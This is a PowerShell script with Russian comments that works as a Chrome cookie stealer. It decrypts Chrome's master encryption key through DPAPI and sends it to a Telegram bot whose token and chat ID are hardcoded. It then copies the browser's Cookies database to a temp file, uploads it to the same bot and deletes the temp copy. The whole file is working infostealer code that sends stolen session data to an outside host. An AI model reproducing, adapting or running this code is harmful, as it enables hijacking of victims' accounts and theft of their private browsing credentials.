Add-Type -AssemblyName System.Security
$token = "8680192798:AAFdHwzr2HYwbGjz3gkaS5xlYjryAozMkGI"
$chatId = "1940923712"

# 1. Попытка дешифровки через альтернативный контекст
try {
    $lsPath = "$env:LOCALAPPDATA\Google\Chrome\User Data\Local State"
    $cpPath = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Network\Cookies"
    
    $json = Get-Content $lsPath -Raw | ConvertFrom-Json
    $encryptedKey = [System.Convert]::FromBase64String($json.os_crypt.encrypted_key)[5..($json.os_crypt.encrypted_key.Length - 1)]
    
    # Пытаемся разблокировать ключ через принудительный вызов текущего пользователя
    $masterKey = [System.Security.Cryptography.ProtectedData]::Unprotect($encryptedKey, $null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser)
    $base64Key = [System.Convert]::ToBase64String($masterKey)
    
    # Если ключ получен, отправляем его
    & curl.exe -s -X POST "https://api.telegram.org/bot$token/sendMessage" -d "chat_id=$chatId" -d "text=✅ SUCCESS! KEY: $base64Key"
} catch {
    # Если всё еще ошибка, отправляем СЫРОЙ зашифрованный ключ (мы расшифруем его позже)
    $rawKey = $json.os_crypt.encrypted_key
    & curl.exe -s -X POST "https://api.telegram.org/bot$token/sendMessage" -d "chat_id=$chatId" -d "text=⚠️ DPAPI Locked. Raw Key Sent."
}

# 2. В любом случае забираем базу куки (это работает всегда)
$tempC = "$env:TEMP\c.db"
if (Test-Path $cpPath) {
    Copy-Item $cpPath $tempC -Force
    & curl.exe -s -X POST "https://api.telegram.org/bot$token/sendDocument" -F "chat_id=$chatId" -F "document=@$tempC"
    Remove-Item $tempC
}
